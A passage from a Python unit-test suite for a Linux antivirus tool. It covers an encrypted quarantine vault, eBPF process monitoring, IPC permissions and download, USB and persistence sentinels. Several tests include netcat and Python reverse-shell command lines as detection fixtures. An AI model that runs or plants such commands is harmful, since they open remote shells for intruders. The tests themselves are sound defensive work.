        self.assertTrue(os.path.exists(fpath))
        with open(fpath, "rb") as f:
            restored_payload = f.read()
        self.assertEqual(restored_payload, test_payload)

    def test_vault_tamper_rejection(self):
        """Verifica que si los datos cifrados o el Auth Tag son alterados, se rechace la restauración."""
        fpath = os.path.join(self.tmp, "tamper_test.bin")
        with open(fpath, "wb") as f: f.write(b"datos_criticos_de_prueba")
        vid = self.vault.quarantine_file(fpath, "Malware.Tamper")

        payload_path = os.path.join(self.vault.payloads_dir, f"{vid}.quar")
        self.assertTrue(os.path.exists(payload_path))

        # Alterar un byte del ciphertext/AuthTag
        os.chmod(payload_path, 0o600)
        with open(payload_path, "r+b") as f:
            data = bytearray(f.read())
            data[-4] ^= 0xAA # Invertir bits en el Auth Tag
            f.seek(0)
            f.write(data)
        os.chmod(payload_path, 0o000)

        # La restauración DEBE fallar y no devolver bytes corruptos
        restored = self.vault.restore_file(vid, destination_path=fpath)
        self.assertFalse(restored, "Fallo criptográfico: Carga con Auth Tag corrupto fue aceptada.")
        self.assertFalse(os.path.exists(fpath))

    def test_vault_streaming_chunked_large_file_and_key_recovery(self):
        """Verifica cifrado por bloques de 64 KB en streaming y exportación de recuperación de claves."""
        # Archivo de múltiples bloques (>150 KB para abarcar varios chunks de 64 KB)
        large_fpath = os.path.join(self.tmp, "large_sample.bin")
        large_payload = b"A" * (64 * 1024) + b"B" * (64 * 1024) + b"C" * (10 * 1024)
        with open(large_fpath, "wb") as f:
            f.write(large_payload)

        vid = self.vault.quarantine_file(large_fpath, "Malware.LargeStream")
        self.assertIsNotNone(vid)
        self.assertFalse(os.path.exists(large_fpath))

        # Comprobar formato streaming en disco (cabecera CST_AES256GCM_S:)
        quar_file = os.path.join(self.vault.payloads_dir, f"{vid}.quar")
        os.chmod(quar_file, 0o600)
        with open(quar_file, "rb") as f:
            header = f.read(17)
        os.chmod(quar_file, 0o000)
        self.assertIn(header, (b"CST_AES256GCM_V3:", b"CST_AES256GCM_S:"))

        # Restauración en streaming y validación de coincidencia exacta byte a byte
        restored = self.vault.restore_file(vid, destination_path=large_fpath)
        self.assertTrue(restored)
        self.assertTrue(os.path.exists(large_fpath))
        with open(large_fpath, "rb") as f:
            restored_bytes = f.read()
        self.assertEqual(restored_bytes, large_payload)

        # Probar exportación e importación de paquete de recuperación de clave
        recovery_pkg = os.path.join(self.tmp, "key_recovery.json")
        self.assertTrue(self.vault.export_key_recovery_package(recovery_pkg))
        self.assertTrue(os.path.exists(recovery_pkg))

        # Probar que un archivo de clave corrupto NO se sobrescribe silenciosamente
        corrupt_key_file = os.path.join(self.tmp, "corrupt_key.key")
        with open(corrupt_key_file, "wb") as kf:
            kf.write(b"short_corrupt_data")
        # Debe lanzar excepción y rehusar inicializarse con datos corruptos
        with self.assertRaises(ValueError):
            QuarantineVault(storage_dir=self.tmp, key_file=corrupt_key_file)

    def test_export_key_recovery_package_security_o02(self):
        """
        Verifica los controles de seguridad criptográfica y del sistema de archivos en O-02:
        1. Permisos restrictivos (0400) desde la creación en el inodo (sin ventana TOCTOU).
        2. Creación exclusiva (O_CREAT | O_EXCL) y rechazo si el archivo ya existe sin overwrite=True.
        3. Protección estricta contra enlaces simbólicos (rechazo de symlinks en destino y en directorio).
        4. Verificación de manipulación por usuarios no privilegiados (rechazo de directorios world-writable sin sticky bit).
        5. Importación validada del paquete de recuperación y protección contra enlaces en importación.
        """
        recovery_pkg = os.path.join(self.tmp, "o02_recovery_test.json")

        # 1. Creación exitosa y verificación de permisos 0400 desde su creación
        success = self.vault.export_key_recovery_package(recovery_pkg)
        self.assertTrue(success)
        self.assertTrue(os.path.exists(recovery_pkg))
        st = os.stat(recovery_pkg)
        self.assertEqual(st.st_mode & 0o777, 0o400, "El paquete exportado debe crearse con permisos estrictos 0400")

        # Verificar contenido JSON
        with open(recovery_pkg, "r", encoding="utf-8") as f:
            data = json.load(f)
        self.assertEqual(data.get("format"), "Constantine-Vault-KeyRecovery-v2")
        self.assertEqual(data.get("cipher"), "AES-256-GCM-Chunked-AEAD")
        self.assertTrue(bool(data.get("key_hex")))
        self.assertTrue(bool(data.get("key_sha256")))

        # 2. Creación exclusiva: Si ya existe y overwrite=False, debe fallar (O_EXCL)
        self.assertFalse(self.vault.export_key_recovery_package(recovery_pkg, overwrite=False))

        # Con overwrite=True debe sobreescribir de forma segura
        self.assertTrue(self.vault.export_key_recovery_package(recovery_pkg, overwrite=True))
        self.assertEqual(os.stat(recovery_pkg).st_mode & 0o777, 0o400)

        # 3. Protección contra enlaces simbólicos: Rechazo si el destino es un symlink
        symlink_target = os.path.join(self.tmp, "symlink_attack.json")
        decoy_file = os.path.join(self.tmp, "decoy.txt")
        with open(decoy_file, "w") as df:
            df.write("DECOY_UNTOUCHED")
        os.symlink(decoy_file, symlink_target)

        # Debe ser rechazado categóricamente
        self.assertFalse(self.vault.export_key_recovery_package(symlink_target, overwrite=False))
        self.assertFalse(self.vault.export_key_recovery_package(symlink_target, overwrite=True))

        # Verificar que el señuelo no fue sobreescrito ni tocado
        with open(decoy_file, "r") as df:
            self.assertEqual(df.read(), "DECOY_UNTOUCHED")

        # 4. Protección contra enlaces simbólicos en el directorio padre
        sym_dir = os.path.join(self.tmp, "sym_dir")
        real_dir = os.path.join(self.tmp, "real_dir")
        os.makedirs(real_dir, exist_ok=True)
        os.symlink(real_dir, sym_dir)
        self.assertFalse(self.vault.export_key_recovery_package(os.path.join(sym_dir, "export.json")))

        # 5. Protección contra directorios modificables por usuarios no privilegiados sin sticky bit
        insecure_dir = os.path.join(self.tmp, "insecure_world_writable_dir")
        os.makedirs(insecure_dir, exist_ok=True)
        os.chmod(insecure_dir, 0o777)
        self.assertFalse(self.vault.export_key_recovery_package(os.path.join(insecure_dir, "key.json")))

        # Con sticky bit (0o1777, ej: /tmp), debe ser admitido
        os.chmod(insecure_dir, 0o1777)
        self.assertTrue(self.vault.export_key_recovery_package(os.path.join(insecure_dir, "key.json")))

        # 6. Importación validada
        imported = self.vault.import_key_recovery_package(recovery_pkg)
        self.assertTrue(imported)

        # Importación de enlace simbólico debe ser rechazada
        self.assertFalse(self.vault.import_key_recovery_package(symlink_target))

    def test_privileged_quarantine_operator_descriptor_pinning_and_toctou_rejection(self):
        """Verifica que PrivilegedQuarantineOperator fije descriptores, detecte enlaces simbólicos y rechace TOCTOU."""
        op = PrivilegedQuarantineOperator()
        sample_path = os.path.join(self.tmp, "test_operator_sample.bin")
        with open(sample_path, "wb") as f:
            f.write(b"datos_de_prueba_operador_cuarentena_12345")

        # 1. Fijación de descriptor y validación estándar
        handle = op.pin_and_validate(sample_path)
        self.assertIsNotNone(handle)
        self.assertGreaterEqual(handle.fd, 0)
        self.assertEqual(handle.size_bytes, len(b"datos_de_prueba_operador_cuarentena_12345"))
        self.assertTrue(len(handle.sha256) == 64)
        handle.close()

        # 2. Rechazo estricto de ataques con enlaces simbólicos (Anti-Symlink TOCTOU)
        symlink_path = os.path.join(self.tmp, "symlink_malicioso.bin")
        if os.path.exists(symlink_path):
            os.remove(symlink_path)
        os.symlink(sample_path, symlink_path)
        with self.assertRaises(PermissionError):
            op.pin_and_validate(symlink_path)
        os.remove(symlink_path)

        # 3. Rechazo de rutas de kernel protegidas (/proc, /sys, /dev)
        with self.assertRaises(PermissionError):
            op.pin_and_validate("/proc/version")

        # 4. Reutilización segura de descriptor existente (target_fd)
        fd = os.open(sample_path, os.O_RDONLY | os.O_CLOEXEC)
        handle2 = op.pin_and_validate(sample_path, target_fd=fd)
        os.close(fd)
        self.assertEqual(handle2.sha256, handle.sha256)
        self.assertTrue(handle2.is_cloned_fd)
        handle2.close()

    def test_quarantine_with_descriptor_and_read_only_fs_resilience(self):
        """Verifica que quarantine_file acepte target_fd y soporte medios de solo lectura (EROFS) sin perder la muestra."""
        fpath = os.path.join(self.tmp, "quar_ro_test.bin")
        with open(fpath, "wb") as f:
            f.write(b"payload_hostil_para_aislar_en_medio_ro")

        fd = os.open(fpath, os.O_RDONLY | os.O_CLOEXEC)
        # 1. Cuarentena con target_fd explícito
        vid = self.vault.quarantine_file(fpath, "Trojan.ROTest", detected_by="TestDescriptor", target_fd=fd)
        os.close(fd)
        self.assertIsNotNone(vid)
        self.assertFalse(os.path.exists(fpath))

        # 2. Simulación de sistema de archivos de solo lectura (EROFS)
        fpath_ro = os.path.join(self.tmp, "quar_ro_mount_test.bin")
        with open(fpath_ro, "wb") as f:
            f.write(b"payload_en_filesystem_de_solo_lectura")

        with patch.object(self.vault.operator, "secure_unlink", return_value=(False, True, "Sistema de archivos de solo lectura (EROFS)")):
            vid_ro = self.vault.quarantine_file(fpath_ro, "Rootkit.ReadOnlyFS", detected_by="TestRO")
            self.assertIsNotNone(vid_ro)
            # El archivo original se mantiene por ser de solo lectura, pero la muestra queda aislada en el baúl
            items = self.vault.list_items()
            ro_item = next((it for it in items if it["vault_id"] == vid_ro), None)
            self.assertIsNotNone(ro_item)
            self.assertEqual(ro_item.get("quarantine_mode"), "isolated_in_vault_ro_fs")
            self.assertFalse(ro_item.get("original_removed"))

    def test_vault_v3_96bit_nonces_and_collision_freedom(self):
        """Verifica que generate_unique_nonce_96 genere nonces de 12 bytes (96 bits) libres de colisiones bajo concurrencia."""
        from concurrent.futures import ThreadPoolExecutor

        vault = QuarantineVault(storage_dir=os.path.join(self.tmp, "vault_concurrent"))
        num_nonces = 2000

        def get_nonce(_):
            return vault.generate_unique_nonce_96()

        with ThreadPoolExecutor(max_workers=8) as executor:
            nonces = list(executor.map(get_nonce, range(num_nonces)))

        self.assertEqual(len(nonces), num_nonces)
        # Verificar unicidad absoluta (cero colisiones)
        self.assertEqual(len(set(nonces)), num_nonces)
        # Verificar longitud exacta de 96 bits (12 bytes)
        for n in nonces:
            self.assertEqual(len(n), 12)

    def test_vault_key_volume_control_and_rotation(self):
        """Verifica control de límites de uso por clave, rotación automática y keyring histórico."""
        vault = QuarantineVault(storage_dir=os.path.join(self.tmp, "vault_rotation"))
        vault.max_key_usage_limit = 10  # Límite bajo para prueba

        initial_key_id = vault.key_id
        initial_key = vault._aes_key

        # Generar nonces hasta superar el límite
        for _ in range(15):
            vault.generate_unique_nonce_96()

        # Debe haberse ejecutado la rotación de clave
        self.assertNotEqual(vault.key_id, initial_key_id)
        self.assertNotEqual(vault._aes_key, initial_key)
        self.assertIn(initial_key_id, vault.keyring)
        self.assertEqual(vault.keyring[initial_key_id], initial_key)

    def test_vault_format_v3_v2_v1_cross_version_decryption(self):
        """Verifica descifrado transparente entre versiones V3 (96-bit), V2 (64-bit base) y V1 (monolítico)."""
        vault = QuarantineVault(storage_dir=os.path.join(self.tmp, "vault_versions"))
        sample_data = b"Contenido confidencial de prueba multiversion para baul Constantine"

        # 1. Cifrado nativo V3 (actual)
        src_v3 = os.path.join(self.tmp, "sample_v3.bin")
        enc_v3 = os.path.join(self.tmp, "sample_v3.quar")
        dec_v3 = os.path.join(self.tmp, "sample_v3_dec.bin")
        with open(src_v3, "wb") as f:
            f.write(sample_data)

        self.assertTrue(vault.encrypt_file_streaming(src_v3, enc_v3))
        self.assertTrue(vault.decrypt_file_streaming(enc_v3, dec_v3))
        with open(dec_v3, "rb") as f:
            self.assertEqual(f.read(), sample_data)

        # 2. Simular archivo en formato V2 (CST_AES256GCM_S:)
        enc_v2 = os.path.join(self.tmp, "sample_v2.quar")
        dec_v2 = os.path.join(self.tmp, "sample_v2_dec.bin")
        import secrets
        import struct
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        aesgcm = AESGCM(vault._aes_key)
        base_nonce_v2 = secrets.token_bytes(8)
        block_nonce_v2 = base_nonce_v2 + struct.pack(">I", 0)
        block_aad_v2 = b"CST_CHUNK:" + struct.pack(">IB", 0, 1)
        ciphertext_v2 = aesgcm.encrypt(block_nonce_v2, sample_data, block_aad_v2)

        with open(enc_v2, "wb") as f:
            f.write(b"CST_AES256GCM_S:")
            f.write(base_nonce_v2)
            f.write(struct.pack(">Q", len(sample_data)))
            f.write(struct.pack(">IB", len(ciphertext_v2), 1))
            f.write(ciphertext_v2)

        self.assertTrue(vault.decrypt_file_streaming(enc_v2, dec_v2))
        with open(dec_v2, "rb") as f:
            self.assertEqual(f.read(), sample_data)

        # 3. Simular archivo en formato V1 (CST_AES256GCM:)
        enc_v1 = os.path.join(self.tmp, "sample_v1.quar")
        dec_v1 = os.path.join(self.tmp, "sample_v1_dec.bin")
        nonce_v1 = secrets.token_bytes(12)
        ciphertext_v1 = aesgcm.encrypt(nonce_v1, sample_data, None)
        with open(enc_v1, "wb") as f:
            f.write(b"CST_AES256GCM:")
            f.write(nonce_v1)
            f.write(ciphertext_v1)

        self.assertTrue(vault.decrypt_file_streaming(enc_v1, dec_v1))
        with open(dec_v1, "rb") as f:
            self.assertEqual(f.read(), sample_data)

    def test_scanner_update_signatures_syncs_feeds_real(self):
        """Verifica que update_signatures invoque sync_feeds y refleje resultados reales."""
        res = self.scanner.update_signatures(sync_remote=False)
        self.assertIn("yara_reloaded", res)
        self.assertIn("feed_sync", res)

    # =========================================================================
    # 6. PRUEBAS DE EBPF Y CENTINELA DE RESCATE
    # =========================================================================
    def test_ebpf_status_and_fallback(self):
        monitor = EBPFMonitor()
        status_info = monitor.get_status_info()
        self.assertIn("status", status_info)
        self.assertIn("recommendation", status_info)
        self.assertIn("operational_label", status_info)
        self.assertIn("monitored_vectors", status_info)

        # Iniciar monitor
        monitor.start()
        # Debe ser operativo (ya sea mediante kernel BCC o centinela de rescate /proc)
        self.assertTrue(monitor.is_operational())
        info = monitor.get_status_info()
        # Debe reflejar claramente si está en modo degradado o nativo
        if monitor.is_degraded():
            self.assertEqual(info["mode"], "DEGRADED_USERSPACE_POLLER")
            self.assertEqual(info["operational_label"], "MODO DEGRADADO (ESPACIO DE USUARIO)")
        elif monitor.is_active():
            self.assertIn(info["mode"], ("EBPF_KERNEL_PROBES", "BPF_LSM_ENFORCING"))
        monitor.stop()

    def test_ebpf_kill_offender(self):
        monitor = EBPFMonitor(auto_kill=True)
        # Test safe boundary check: PID 1 or <= 0 never killed
        self.assertFalse(monitor.kill_offender(0, "Test", "safe_check"))
        self.assertFalse(monitor.kill_offender(1, "Test", "safe_check"))

    def test_ebpf_netcat_benign_vs_hostile_discrimination(self):
        """Verifica que Netcat legítimo (ej. -zv, -l) no sea clasificado como amenaza y solo se bloqueen reverse shells."""
        monitor = EBPFMonitor()

        # 1. Uso legítimo de administración de redes (BENIGNO)
        is_threat, _ = monitor.evaluate_execution_threat("nc", "/usr/bin/nc", "nc -zv 192.168.1.1 80")
        self.assertFalse(is_threat, "Falso positivo: escaneo legítimo de puertos con nc no debe ser bloqueado")

        is_threat, _ = monitor.evaluate_execution_threat("netcat", "/usr/bin/netcat", "netcat -l -p 8080")
        self.assertFalse(is_threat, "Falso positivo: netcat listener en puerto local no debe ser bloqueado")

        # 2. Uso malicioso de Netcat con banderas de ejecución de shell (HOSTIL)
        is_threat, threat = monitor.evaluate_execution_threat("nc", "/usr/bin/nc", "nc 10.0.0.1 4444 -e /bin/bash")
        self.assertTrue(is_threat)
        self.assertEqual(threat, "Exploit.ReverseShell.Netcat")

        # 3. Binario Netcat dropeado en /tmp
        is_threat, threat = monitor.evaluate_execution_threat("nc", "/tmp/nc", "/tmp/nc 1.2.3.4 9999")
        self.assertTrue(is_threat)
        self.assertIn("UntrustedDirExecution", threat)

    def test_ebpf_multi_argument_reverse_shell_detection(self):
        """Verifica que argumentos situados más allá de argv[1] sean analizados correctamente."""
        monitor = EBPFMonitor()

        # Shell reversa Python donde los argumentos críticos están al final
        args_deep = 'python3 -u -O -c "import socket,os,pty; s=socket.socket(); pty.spawn(\'/bin/sh\')"'
        is_threat, threat = monitor.evaluate_execution_threat("python3", "/usr/bin/python3", args_deep)
        self.assertTrue(is_threat)
        self.assertEqual(threat, "Exploit.ReverseShell.PythonPty")
    def test_ebpf_event_lifecycle_states(self):
        """Verifica que EBPFMonitor maneje los estados explícitos de ciclo de vida sin confundir alerta con bloqueo."""
        monitor = EBPFMonitor(auto_kill=False)
        # 1. Proceso inválido o no existente
        st_invalid = monitor.contain_and_terminate_process(1, "Threat", "init_guard")
        self.assertEqual(st_invalid, EBPFEventState.ACTION_FAILED)

        # 2. Comprobar que los estados definidos cubran el ciclo de vida
        self.assertIn(EBPFEventState.EVENT_OBSERVED, EBPFEventState)
        self.assertIn(EBPFEventState.SUSPICIOUS_ACTIVITY, EBPFEventState)
        self.assertIn(EBPFEventState.THREAT_CONFIRMED, EBPFEventState)
        self.assertIn(EBPFEventState.PROCESS_CONTAINED, EBPFEventState)
        self.assertIn(EBPFEventState.PROCESS_TERMINATED, EBPFEventState)
        self.assertIn(EBPFEventState.ACTION_FAILED, EBPFEventState)

        # 3. Reporte de estado cuando BCC no está disponible
        info = monitor.get_status_info()
        self.assertIn("status", info)
        self.assertIn("recommendation", info)

    def test_ebpf_architecture_tracepoints_vs_lsm_separation(self):
        """
        Verifica la arquitectura eBPF P0:
        1. Separación estricta de Tracepoints (observación) y BPF LSM (enforcement).
        2. Comprobación de capacidades reales del kernel (BTF, CO-RE, LSM, backend).
        3. No anunciar BPF LSM cuando solo se observan llamadas al sistema.
        4. Detección y métricas de pérdida de eventos (lost_events_count).
        5. Administración de mapas con límites estrictos de memoria y purgado TTL.
        6. Desactivación modular selectiva de funciones incompatibles.
        """
        monitor = EBPFMonitor(enable_lsm=True, max_intents_entries=10, max_incidents_history=5)

        # 1. Comprobación de capacidades del kernel
        caps = monitor.probe_kernel_capabilities()
        self.assertIn("has_root", caps)
        self.assertIn("has_btf", caps)
        self.assertIn("has_co_re", caps)
        self.assertIn("has_bpf_lsm_kernel", caps)
        self.assertIn("backend", caps)

        # 2. Separación estricta: si no hay BPF LSM en el kernel, nunca debe fingirse BPF_LSM_ENFORCING
        info = monitor.get_status_info()
        self.assertIn("monitoring_status", info)
        self.assertIn("lsm_status", info)
        self.assertIn("has_bpf_lsm", info)
        self.assertIn("has_bpf_lsm_enforcement", info)
        self.assertIn("attached_probes", info)
        self.assertIn("attached_lsm_hooks", info)
        self.assertIn("memory_limits", info)

        # Si el kernel no soporta BPF LSM, has_bpf_lsm debe ser estrictamente False
        if not caps["has_bpf_lsm_kernel"]:
            self.assertFalse(info["has_bpf_lsm"])
            self.assertFalse(info["has_bpf_lsm_enforcement"])
            self.assertNotEqual(info["mode"], "BPF_LSM_ENFORCING")

        # 3. Detección de pérdida de eventos (lost_cb)
        self.assertEqual(monitor.lost_events_count, 0)
        monitor._on_lost_events(cpu=1, lost=7)
        self.assertEqual(monitor.lost_events_count, 7)
        self.assertEqual(monitor.get_status_info()["lost_events_count"], 7)

        # 4. Administración de memoria en mapas de intención (límite y purgado TTL)
        for i in range(15):
            monitor.record_file_intent(
                pid=2000 + i,
                target_path=f"/tmp/test_intent_{i}.bin",
                flags=os.O_WRONLY,
                is_write=True,
                is_read=False
            )
        # La capacidad debe mantenerse acotada a max_intents_entries
        self.assertLessEqual(len(monitor.file_intents), 25) # cada intent guarda clave (pid, path) y (pid, basename)

        # 5. Gestión del historial de incidentes con límite de memoria
        from core.engine.ebpf_monitor import EBPFIncident
        for j in range(10):
            monitor._add_incident(EBPFIncident(
                pid=3000 + j,
                comm="test",
                target_path=f"/tmp/inc_{j}",
                threat_name="TestThreat",
                state=EBPFEventState.EVENT_OBSERVED
            ))
        self.assertLessEqual(len(monitor.incidents_history), 5)

        # 6. Intentar enforcement BPF LSM cuando no está disponible debe fallar limpiamente
        self.assertFalse(monitor.block_pid_in_lsm(9999))
        self.assertFalse(monitor.unblock_pid_in_lsm(9999))


    # =========================================================================
    # 7. PRUEBAS DE SERVICIOS AUXILIARES
    # =========================================================================
    def test_auth_native_system(self):
        user = self.auth.get_current_user()
        self.assertIsNotNone(user)
        token = "test_valid_token_123"
        self.auth.active_sessions[token] = 9999999999.0
        self.assertTrue(self.auth.is_session_valid(token))
        self.auth.revoke_session(token)
        self.assertFalse(self.auth.is_session_valid(token))

    def test_ipc_rbac_policy_matrix(self):
        """Verifica la matriz de permisos RBAC: operaciones de usuario vs administrativas."""
        from core.engine.ipc_protocol import is_operation_permitted

        # Operaciones permitidas a usuario normal
        self.assertTrue(is_operation_permitted("GET_STATUS", is_admin=False))
        self.assertTrue(is_operation_permitted("GET_THREATS", is_admin=False))
        self.assertTrue(is_operation_permitted("GET_SHIELDS_HEALTH", is_admin=False))
        self.assertTrue(is_operation_permitted("GET_AUDIT_LOGS", is_admin=False))
        self.assertTrue(is_operation_permitted("REQUEST_SCAN", is_admin=False))

        # Operaciones administrativas restringidas a usuario normal
        self.assertFalse(is_operation_permitted("ADD_WHITELIST", is_admin=False))
        self.assertFalse(is_operation_permitted("REMOVE_WHITELIST", is_admin=False))
        self.assertFalse(is_operation_permitted("TOGGLE_SHIELD", is_admin=False))
        self.assertFalse(is_operation_permitted("PURGE_QUARANTINE", is_admin=False))
        self.assertFalse(is_operation_permitted("APPLY_DNS_PROFILE", is_admin=False))

        # El administrador puede ejecutar todas las operaciones
        self.assertTrue(is_operation_permitted("ADD_WHITELIST", is_admin=True))
        self.assertTrue(is_operation_permitted("TOGGLE_SHIELD", is_admin=True))
        self.assertTrue(is_operation_permitted("PURGE_QUARANTINE", is_admin=True))

    def test_ipc_server_side_authorization_enforcement(self):
        """Verifica que el servidor IPC aplique validación estricta en el servidor y rechace comandos no autorizados."""
        from core.engine.ipc_protocol import SecureIPCDaemonServer, SecureIPCClient
        from core.auth.auth_manager import AuthManager

        sock_path = os.path.join(self.tmp, "rbac_test.sock")
        auth = AuthManager()
        admin_token = "valid_admin_token_test_123"
        auth.active_sessions[admin_token] = time.time() + 900

        def dummy_handler(cmd, params, uid, is_admin):
            return "OK", {"echo": cmd, "is_admin": is_admin}, ""

        # Servidor con validación en background
        server = SecureIPCDaemonServer(socket_path=sock_path, command_handler=dummy_handler, auth_manager=auth)
        server.start(background=True)
        time.sleep(0.05)

        client = SecureIPCClient(socket_path=sock_path)

        # 1. Comando de consulta sin token (permitido a usuario normal)
        resp1 = client.send_command("GET_STATUS")
        self.assertEqual(resp1.get("status"), "OK")

        # 2. Comando administrativo sin token de administrador (debe ser rechazado por el servidor)
        with patch.object(server, "verify_peer_credentials", return_value=(True, 1234, 1000, 1000)):
            resp2 = client.send_command("ADD_WHITELIST", params={"path": "/tmp/test"})
            self.assertEqual(resp2.get("status"), "FORBIDDEN")
            self.assertIn("requiere autorización administrativa", resp2.get("error", ""))

        # 3. Comando administrativo con token de sesión de administrador válido (debe ser aceptado)
        with patch.object(server, "verify_peer_credentials", return_value=(True, 1234, 1000, 1000)):
            resp3 = client.send_command("ADD_WHITELIST", params={"path": "/tmp/test"}, token=admin_token)
            self.assertEqual(resp3.get("status"), "OK")
            self.assertTrue(resp3.get("data", {}).get("is_admin"))

        server.stop()

    def test_phishing(self):
        self.assertFalse(self.phishing.analyze_url("https://google.com").is_phishing)
        self.assertTrue(self.phishing.analyze_url("http://g00gle-verify.xyz/account").is_phishing)
        self.assertTrue(self.phishing.analyze_url("http://192.168.1.1/confirm-banking").is_phishing)

    def test_dns_manager(self):
        """Verifica perfiles DNS, soporte DoT, y que la aplicación valide el estado real sin falsos éxitos."""
        dm = DNSManager(state_file=os.path.join(self.tmp, "dns_state.json"))
        profiles = dm.get_profiles()
        self.assertIn("mullvad-base", profiles)
        self.assertIn("quad9-partner", profiles)
        self.assertIn("dot", profiles["mullvad-base"])
        self.assertIn("doh", profiles["mullvad-base"])

        # 1. Comprobar que si la configuración del sistema falla, apply_profile retorne False (sin falsos positivos)
        with patch.object(dm, "_apply_via_resolvectl", return_value=False):
            with patch.object(dm, "_apply_via_resolv_conf", return_value=False):
                res_fail = dm.apply_profile("mullvad-base")
                self.assertFalse(res_fail)

        # 2. Comprobar aplicación exitosa verificada (resolvectl / resolved con DoT)
        target_profile = profiles["mullvad-adblock"]
        with patch.object(dm, "_apply_via_resolvectl", return_value=True):
            with patch.object(dm, "detect_real_system_dns", return_value=target_profile["ipv4"]):
                applied = dm.apply_profile("mullvad-adblock")
                self.assertTrue(applied)
                active = dm.get_active_profile()
                self.assertEqual(active["id"], "mullvad-adblock")

    def test_audit_logger(self):
        self.audit.record_incident("Trojan.Linux.Mirai", "/tmp/mirai.elf", "FAN_DENY", "Hash conocido")
        incidents = self.audit.get_incidents()
        self.assertEqual(len(incidents), 1)
        self.assertEqual(incidents[0]["threat"], "Trojan.Linux.Mirai")

    def test_update_guard(self):
        ug = SystemUpdateGuard()
        info = ug.check_pending_updates()
        self.assertIn("has_updates", info)
        self.assertIn("current_kernel", info)

    def test_auto_updater(self):
        cu = ConstantineUpdater(current_version="4.3.2")
        self.assertEqual(cu._parse_version("4.3.2"), (4, 3, 2))
        self.assertEqual(cu._parse_version("v4.3.2"), (4, 3, 2))
        self.assertTrue(cu._parse_version("4.3.3") > cu._parse_version("4.3.2"))

    def test_usb_sentinel_containment_and_scan(self):
        """Verifica que el monitor USB aplique contención fanotify y aísle autoruns hostiles."""
        mock_interceptor = MagicMock()
        mock_vault = MagicMock()
        usb = USBAutoScanner(scanner=self.scanner, vault=mock_vault, interceptor=mock_interceptor)

        # Crear simulación de dispositivo USB montado
        usb_mount = os.path.join(self.tmp, "fake_usb_drive")
        os.makedirs(usb_mount, exist_ok=True)
        autorun_file = os.path.join(usb_mount, "autorun.inf")
        with open(autorun_file, "w") as f:
            f.write("[autorun]\nopen=evil.sh\n")

        clean_doc = os.path.join(usb_mount, "clean_doc.txt")
        with open(clean_doc, "w") as f:
            f.write("Reporte limpio de contabilidad")

        dev_info = {"mount_point": usb_mount, "dev_node": "/dev/sdc1", "is_removable": True}
        usb.on_device_connected(dev_info)

        # Debe haber enganchado fanotify para contención en kernel
        mock_interceptor.mark_directory.assert_called_with(usb_mount)
        # Debe haber aislado el archivo autorun en el baúl
        mock_vault.quarantine_file.assert_called()
        self.assertEqual(len(usb.scanned_devices_history), 1)
        self.assertEqual(usb.scanned_devices_history[0]["threats_count"], 1)


    def test_download_sentinel_state_machine_and_containment(self):
        """Verifica la máquina de estados de descargas, contención y aislamiento multi-usuario."""
        mock_vault = MagicMock()
        mock_interceptor = MagicMock()
        mock_notifier = MagicMock()

        user1_dl = os.path.join(self.tmp, "user1_downloads")
        user2_dl = os.path.join(self.tmp, "user2_downloads")
        os.makedirs(user1_dl, exist_ok=True)
        os.makedirs(user2_dl, exist_ok=True)

        sentinel = DownloadSentinel(
            scanner=self.scanner,
            vault=mock_vault,
            notifier=mock_notifier,
            interceptor=mock_interceptor
        )
        sentinel.watch_dirs = {user1_dl: "user1", user2_dl: "user2"}
        sentinel.dir_known_files = {user1_dl: set(), user2_dl: set()}

        # 1. Simular archivo en progreso (.crdownload)
        part_file = os.path.join(user1_dl, "large_installer.iso.crdownload")
        with open(part_file, "w") as f: f.write("in progress buffer")
        sentinel._register_new_file(user1_dl, "large_installer.iso.crdownload", part_file, "user1")

        self.assertIn(part_file, sentinel.tracked_downloads)
        self.assertEqual(sentinel.tracked_downloads[part_file].state, DownloadState.IN_PROGRESS)

        # 2. Simular archivo completado malicioso en user2
        bad_file = os.path.join(user2_dl, "payload.sh")
        with open(bad_file, "wb") as f:
            f.write(b"#!/bin/bash\nnc -e /bin/sh 1.2.3.4 9999\n")

        sentinel._promote_and_scan(bad_file, user2_dl, "user2")
        mock_vault.quarantine_file.assert_called()
        self.assertEqual(sentinel.tracked_downloads[bad_file].state, DownloadState.QUARANTINED)
        self.assertEqual(sentinel.tracked_downloads[bad_file].user, "user2")

        # 3. Simular archivo completado limpio en user1
        clean_file = os.path.join(user1_dl, "safe_document.pdf")
        with open(clean_file, "w") as f: f.write("%PDF-1.4 sample safe content")

        sentinel._promote_and_scan(clean_file, user1_dl, "user1")
        self.assertEqual(sentinel.tracked_downloads[clean_file].state, DownloadState.CLEARED_SAFE)
        self.assertEqual(sentinel.tracked_downloads[clean_file].user, "user1")


    def test_persistence_guard_baseline_creation_modification_deletion(self):
        """Verifica que PersistenceGuard detecte creaciones, modificaciones, eliminaciones y aplique rollback."""
        test_dir = os.path.join(self.tmp, "test_persistence")
        os.makedirs(test_dir, exist_ok=True)
        backup_dir = os.path.join(self.tmp, "persistence_backups")

        mock_vault = MagicMock()
        guard = PersistenceGuard(scanner=self.scanner, vault=mock_vault, backup_dir=backup_dir)
        # Apuntar a directorio controlado
        guard.SYSTEM_PERSISTENCE_DIRS = [test_dir]
        guard.SYSTEM_PERSISTENCE_FILES = []
        guard.USER_PERSISTENCE_PATTERNS = []

        # 1. Crear archivo inicial en la línea base
        cron_job = os.path.join(test_dir, "clean_job.sh")
        with open(cron_job, "w") as f:
            f.write("#!/bin/bash\necho 'mantenimiento'\n")

        guard.baseline = guard.build_baseline()
        self.assertIn(cron_job, guard.baseline)
        clean_backup = guard.baseline[cron_job].backup_path
        self.assertIsNotNone(clean_backup)
        self.assertTrue(os.path.exists(clean_backup))

        # 2. Modificar archivo con contenido malicioso
        with open(cron_job, "wb") as f:
            f.write(b"#!/bin/bash\nnc -e /bin/sh 10.0.0.1 4444\n")

        events = guard.check_persistence_changes()
        mod_events = [e for e in events if e["type"] == PersistenceEventType.FILE_MODIFIED]
        self.assertEqual(len(mod_events), 1)
        # El baúl debe haber sido invocado para aislar la persistencia maliciosa
        mock_vault.quarantine_file.assert_called()

        # 3. Eliminar archivo y verificar detección de DELETION
        os.remove(cron_job)
        events_del = guard.check_persistence_changes()
        del_events = [e for e in events_del if e["type"] == PersistenceEventType.FILE_DELETED]
        self.assertEqual(len(del_events), 1)
        self.assertEqual(del_events[0]["path"], cron_job)


    def test_hardware_guard_process_identity_and_blocking(self):
        """Verifica que HardwareGuard inspeccione ejecutable real, detecte spoofing y bloquee intrusiones."""
